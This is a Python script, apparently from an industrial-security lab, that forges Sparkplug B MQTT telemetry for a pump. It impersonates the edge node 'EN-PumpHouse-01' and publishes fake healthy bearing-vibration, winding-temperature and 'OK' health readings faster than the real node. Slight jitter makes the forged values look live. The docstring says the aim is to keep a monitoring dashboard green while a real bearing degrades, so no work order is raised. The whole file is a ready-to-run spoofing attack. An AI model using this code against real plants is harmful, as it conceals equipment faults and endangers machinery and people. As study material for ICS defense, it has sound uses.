"""
Sensor data poisoning — mask a developing fault.

Impersonates the edge node and publishes forged DDATA with healthy vibration
values. Publishes faster than the real node so our values win. No message-level
auth means the platform can't tell the difference.

Result: bearing keeps degrading, dashboard stays green, no work order.

Usage:
    python -m attacker.poison [--host H] [--pump 101] [--de 2.1] [--interval 1.0]
"""

import argparse
import os
import time

import paho.mqtt.client as mqtt

from common import sparkplug as spb
from common.sparkplug import DataType as DT

GROUP = os.environ.get("SPB_GROUP", "NorthPlant")
NODE = os.environ.get("SPB_NODE", "EN-PumpHouse-01")

# Aliases as advertised in the DBIRTH (confirm with recon.py). These are stable.
ALIAS = {"Bearing/DE Vibration": 1, "Bearing/NDE Vibration": 2,
         "Motor/Winding Temperature": 3, "Diagnostics/Health": 7}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=os.environ.get("MQTT_HOST", "localhost"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("MQTT_PORT", "1883")))
    ap.add_argument("--pump", type=int, default=101)
    ap.add_argument("--de", type=float, default=2.1, help="fake DE vibration mm/s")
    ap.add_argument("--interval", type=float, default=1.0)
    ap.add_argument("--duration", type=float, default=0.0,
                    help="stop after N seconds (0 = run until Ctrl-C)")
    args = ap.parse_args()

    topic = spb.topic(GROUP, "DDATA", NODE, f"Pump-{args.pump}")
    c = mqtt.Client(client_id="edge-shadow")
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()

    print(f"[+] Poisoning {topic}")
    print(f"[+] Forcing DE vibration to ~{args.de} mm/s every {args.interval}s")
    print("[+] Leave this running; watch the dashboard stay green while the")
    print("    real bearing (see edge-node logs) keeps climbing. Ctrl-C to stop.\n")

    seq = 0
    n = 0
    start = time.monotonic()
    try:
        while True:
            if args.duration and (time.monotonic() - start) >= args.duration:
                print(f"\n[+] Duration {args.duration}s reached, stopping.")
                break
            p = spb.new_payload(seq=seq)
            seq = (seq + 1) % 256
            # slight jitter so it looks like a live sensor, not a constant
            de = args.de + (0.06 if n % 2 else -0.05)
            spb.add_metric(p, alias=ALIAS["Bearing/DE Vibration"], datatype=DT.Double, value=round(de, 2))
            spb.add_metric(p, alias=ALIAS["Bearing/NDE Vibration"], datatype=DT.Double, value=round(de * 0.8, 2))
            spb.add_metric(p, alias=ALIAS["Motor/Winding Temperature"], datatype=DT.Double, value=54.0)
            spb.add_metric(p, alias=ALIAS["Diagnostics/Health"], datatype=DT.String, value="OK")
            c.publish(topic, spb.encode(p), qos=0)
            n += 1
            if n % 5 == 0:
                print(f"    [{n}] forged DE={de:.2f} mm/s pushed")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[+] Stopped poisoning.")
        c.loop_stop()


if __name__ == "__main__":
    main()
